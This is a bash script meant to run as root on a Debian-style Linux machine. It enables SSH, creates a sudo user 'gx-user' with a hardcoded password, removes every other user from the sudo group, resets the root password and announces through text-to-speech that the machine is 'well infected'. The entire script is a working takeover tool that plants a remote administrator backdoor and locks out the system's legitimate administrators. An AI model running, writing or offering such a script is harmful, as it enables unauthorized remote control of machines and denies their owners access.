RED="\e[31m"
GREEN="\e[32m"
MAGENTA="\e[35m"
YELLOW="\e[33m"
END="\e[0m"

if [ $(id -u) -eq 0 ]; then
    echo -e "${RED}Installing ${GREEN}SSH${END}"
    apt install ssh -y
    ip=$(hostname -I)
    echo ""
    echo -e "SSH is ${GREEN}enable${END} for: ${RED}$ip${END}"
    echo -e "You can now use ssh remote command <${MAGENTA}ssh -t gx-user@${ip}sudo shutdown -h now${END}>"
    echo ""
    password="Ch@ng3M3"
    username="gx-user"
    echo -e "${RED}Adding user $username${END}"
    egrep "^$username" /etc/passwd >/dev/null
    if [ $? -eq 0 ]; then
        echo -e "${MAGENTA}$username ${RED}exists !${END}"
    else
        pass=$(perl -e 'print crypt($ARGV[0], "password")' $password)
        useradd -m -p "$pass" "$username"
        sudo usermod -aG sudo gx-user
        [ $? -eq 0 ] && echo -e "${GREEN}User has been added to system !${END}\nDon't forget to change password using <${MAGENTA}sudo passwd gx-user${END}>\n" || echo -e "${RED}Failed to add a user !${END}"
    fi
    echo ""
    echo -e "${RED}Removing all user from sudo group${END}"

    users=$(getent group sudo)
    users=(${users//:/ })
    users=$(echo ${users[3]} | tr "," "\n")
    for user in $users
    do
        if [ $user != $username ]
        then
            gpasswd -d $user sudo
            echo -e "${MAGENTA}$user${END} ${RED}removed from sudo.${END}"
        fi
    done
    echo ""
    echo -e "${RED}Changing root password${END}"
    passwd root
    echo -e "${RED}Root password updated${END}"

    apt install espeak -y
    espeak "This machine is well infected"

    echo ""
    echo -e "${YELLOW}Don't forget to reboot system !${END}"
else
    echo -e "${RED}Only root may add a user to the system.${END}"
    exit 2
fi